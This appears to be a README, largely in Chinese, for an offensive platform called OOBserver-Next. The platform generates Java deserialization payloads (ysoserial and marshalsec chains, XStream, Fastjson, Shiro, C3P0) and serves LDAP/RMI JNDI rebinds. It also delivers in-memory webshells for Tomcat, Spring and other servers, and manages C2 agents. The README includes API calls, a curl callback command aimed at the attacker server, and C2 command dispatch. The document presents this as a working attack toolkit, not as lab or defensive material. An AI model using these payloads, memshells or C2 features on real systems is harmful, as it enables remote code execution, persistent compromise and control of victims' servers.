# OOBserver-Next

**内网 OOB (Out-of-Band) 漏洞利用平台** — 攻击侧工具，非靶机。

生成利用链 Payload + 接收多协议回调 + 内存马投递 + C2 管理。

---

## 架构

```
         ┌──────────────┐       ┌───────────────────────────────────┐
Browser ──►  Vue 3 UI   │       │  bytecode-service  (Spring :8711)  │
         │  (Vite/EP+)  │       │                                   │
         └──────┬───────┘       │  Payload 生成 (成品 jar 委托)        │
                │ REST+WS       │  ├─ ysoserial-all.jar              │
         ┌──────▼───────┐       │  │   CC1-7, CB1, Spring, Rome...   │
         │  FastAPI     │──────►│  ├─ marshalsec-all.jar             │
         │  :8015       │       │  │   Hessian1/2 gadgets            │
         │  · Auth/JWT  │       │  └─ CustomBytecodeHandler          │
         │  · Projects  │       │      (Javassist, 内存马/exec class)  │
         │  · Tokens    │       └───────────────────────────────────┘
         │  · Payloads  │
         │  · Memshells │  ← 30+ chains
         │  · C2 agents │
         │  · Rebind    │
         └──────────────┘
              │ 监听
    ┌─────────┼──────────────┐
    ▼         ▼              ▼
:1389 LDAP  :1099 RMI   :9999 TCP  [:5353 DNS]
  + javaCodeBase / javaSerializedData rebind
```

---

## 快速开始

### Docker Compose（推荐）

```bash
cp backend/.env.example .env
# 编辑 OOBX_PUBLIC_ADDRESS 为 CT1 IP
docker compose up --build
```

| 服务 | 地址 |
|---|---|
| 后端 API | http://localhost:8015 |
| API 文档 | http://localhost:8015/docs |
| Bytecode Sidecar | http://localhost:8711 |

### 裸机部署

**1. 后端**
```bash
cd backend && cp .env.example .env
python -m venv .venv && source .venv/bin/activate
pip install -e .
uvicorn app.main:app --host 0.0.0.0 --port 8015
```

**2. Sidecar（需先放置 jar 依赖）**
```bash
# 必须放置以下 jar 到 bytecode-service/libs/
mkdir -p bytecode-service/libs
cp ysoserial-all.jar  bytecode-service/libs/   # CC/Spring/Rome 等链
cp marshalsec-all.jar bytecode-service/libs/   # Hessian1/2 链

cd bytecode-service && ./gradlew bootJar
java \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/java.lang=ALL-UNNAMED \
  -jar build/libs/bytecode-service-*.jar
```

**3. 前端（开发）**
```bash
cd frontend && npm install && npm run dev
```

---

## Payload 生成引擎

### 设计原则

**所有利用链委托成品工具**，不自写 gadget 逻辑：

| 工具 | 用途 |
|---|---|
| **ysoserial-all.jar** | CC1-7, CB1, Spring1-2, Rome, Groovy1, Hibernate1, JDK7u21, URLDNS, JRMPClient |
| **marshalsec-all.jar** | Hessian1/Hessian2 (SpringPartiallyComparableAdvisorHolder / XBean / Resin gadget) |
| **Javassist** (内置依赖) | 内存马 class 生成、exec class 生成（CustomBytecodeHandler） |

XStream / Fastjson / Shiro 使用已知公开 gadget 模板 + AES 封装，无自写 gadget 代码。

### API

```
GET  http://localhost:8711/chains          列出所有支持的链 ID
POST http://localhost:8711/generate        生成 payload
     {"chain":"ysoserial_cc6","params":{"cmd":"curl -sk http://OOB_SERVER/callback/http/TOKEN"}}
     返回: {"value":"<base64>","format":"binary|text|json|base64"}
```

**格式说明**：
- `binary` → `base64.b64decode(value)` → 二进制 POST
- `text/json` → `base64.b64decode(value).decode()` → 文本 POST  
- `base64` → value 直接用（如 Shiro cookie）

---

## 利用链全览

### Java 反序列化（ObjectInputStream）

> 端点：`POST /deser`，Content-Type: `application/octet-stream`  
> 委托：**ysoserial** subprocess

| Chain ID | 依赖 | 备注 |
|---|---|---|
| `ysoserial_cc5` | CC 3.x | ✅ 已验证 |
| `ysoserial_cc6` | CC 3.x | ✅ 已验证 |
| `ysoserial_cc7` | CC 3.x | ✅ 已验证 |
| `ysoserial_cb1` | BeanUtils 1.x | ✅ 已验证 |
| `cb_no_cc` | BeanUtils (无CC) | ✅ 已验证 |
| `ysoserial_rome` | rome-1.0 | ✅ 已验证 |
| `ysoserial_cc1/cc3` | CC 3.x + JDK ≤ 8u71 | 需老 JDK |
| `ysoserial_cc2/cc4` | CC 4.x | 需 CC4.x |
| `ysoserial_spring1/2` | Spring 4.x | 需 Spring4 |
| `ysoserial_groovy1` | Groovy | 需 Groovy |
| `ysoserial_hibernate1` | Hibernate | 需 Hibernate |
| `ysoserial_jdk7u21` | Java 7 | 需 JDK7 |
| `ysoserial_urldns` | 任意 | OOB 检测 |
| `ysoserial_jrmp_client` | 任意 | RMI 触发 |

### Hessian 协议

> 端点：`POST /hessian` / `POST /hessian2`  
> 委托：**marshalsec** subprocess（SpringPartiallyComparableAdvisorHolder gadget）  
> **参数**：`jndi_url`（需先在 OOBserver 注册 rebind）

| Chain ID | 协议 |
|---|---|
| `hessian1_spring` / `hessian2_spring` | Hessian 1/2 → Spring gadget |
| `hessian1_rome` / `hessian2_rome` | Hessian 1/2 → Spring gadget (ROME alias) |
| `hessian1_cc6` / `hessian2_cc6` | Hessian 1/2 → Spring gadget (CC6 alias) |

```bash
# 使用方式：先注册 rebind，再用 jndi_url 生成 payload
curl -X POST http://OOB:8015/api/rebind/$TOKEN/set \
  -d '{"class_name":"Exploit","bytecode_b64":"..."}'
curl -X POST http://OOB:8711/generate \
  -d '{"chain":"hessian1_spring","params":{"jndi_url":"ldap://OOB:1389/TOKEN"}}'
```

### XStream

> 端点：`POST /xstream`，Content-Type: `application/xml`（需先 base64 decode）  
> 模板：CVE-2021-39144 EventHandler gadget

| Chain ID | CVE |
|---|---|
| `xstream_eventhandler` | CVE-2021-39144 ✅ 已验证 |

### Fastjson

> 端点：`POST /fastjson`，Content-Type: `application/json`（需先 base64 decode）

| Chain ID | 模式 |
|---|---|
| `fastjson_jdbcrowset` | JNDI → LDAP rebind |
| `fastjson_jdbcrowset_v2` | JNDI bypass (L...;) |
| `fastjson_bcel` | BCEL embed（CustomBytecodeHandler + BCEL 编码）|

### Shiro

> 触发：HTTP `Cookie: rememberMe=<value>`  
> 内层链：ysoserial subprocess

| Chain ID | 模式 |
|---|---|
| `shiro_cbc` | AES-CBC (CVE-2016-4437) |
| `shiro_gcm` | AES-GCM (CVE-2020-11989) |

### C3P0

> 端点：`POST /deser`  
> 内层链：ysoserial subprocess

| Chain ID | 说明 |
|---|---|
| `c3p0_wrapperds` | PoolBackedDataSource 嵌套反序列化 ✅ 已验证 |
| `c3p0_jndi` | WrapperConnectionPoolDataSource JNDI |

---

## LDAP Rebind — 两种模式

### Mode A: javaCodeBase（JDK ≤ 8u191）

```bash
POST /api/rebind/{token}/set
{"class_name":"Exploit","bytecode_b64":"<base64 class file>"}
```

LDAP 返回 `javaCodeBase` URL，目标 JVM 下载并加载 class。

### Mode B: javaSerializedData（绕过 trustURLCodebase，JDK ≥ 8u191）

```bash
POST /api/rebind/{token}/set
{"class_name":"CC6Payload","serialized_b64":"<base64 ysoserial payload>"}
```

LDAP 返回 `javaSerializedData`，目标 JVM 直接反序列化内嵌对象，**无需远程 class 加载**。

---

## 内存马

```bash
POST /api/memshells/generate
{
  "framework": "tomcat",          # tomcat / spring / jetty / jboss / weblogic
  "type": "filter",               # filter / servlet / listener / valve / interceptor
  "shell_type": "cmd",            # cmd / behinder / godzilla / c2
  "url_pattern": "/shell/*",
  "deliver_via": "class_load",    # class_load / jndi_ldap / serialize
  "c2_url": "http://OOB:8015",   # 仅 shell_type=c2 时需要
  "password": "pass123"
}
```

---

## C2 管理

```bash
GET  /api/c2/agents                     查看上线 agents
POST /api/c2/agents/{id}/cmd            发送命令 {"cmd":"id"}
GET  /api/c2/agents/{id}/commands       查看命令结果
```

---

## 配置

| 环境变量 | 默认值 | 说明 |
|---|---|---|
| `OOBX_PUBLIC_ADDRESS` | `127.0.0.1` | **必须设置**为 CT1 IP |
| `OOBX_JWT_SECRET` | `change-me` | 生产环境务必修改 |
| `OOBX_BROKER_PORT` | `8015` | HTTP 后端端口 |
| `OOBX_LDAP_PORT` | `1389` | LDAP 监听 |
| `OOBX_RMI_PORT` | `1099` | RMI 监听 |
| `OOBX_TCP_PORT` | `9999` | TCP 原始回调 |
| `OOBX_DNS_ENABLED` | `false` | 开启 UDP/53 DNS |
| `OOBX_SIDECAR_URL` | `http://127.0.0.1:8711` | Sidecar 地址 |

## 第三方 Jar 依赖（放入 `bytecode-service/libs/`）

| Jar | 来源 | 功能 |
|---|---|---|
| `ysoserial-all.jar` | github.com/frohoff/ysoserial 或 CN fork | CC/Spring/Rome 等 Java 反序列化链 |
| `marshalsec-all.jar` | github.com/mbechler/marshalsec | Hessian1/2 gadget 链 |

## 开发：添加新链

1. `backend/app/payloads/catalog.py` — 注册 chain ID 和参数
2. `bytecode-service/src/main/java/com/oobx/chains/` — 实现 `ChainHandler`
3. `ChainRegistry` — 注册 chain ID
4. **优先调用成品工具**（ysoserial/marshalsec/java-chains），避免自写 gadget 代码
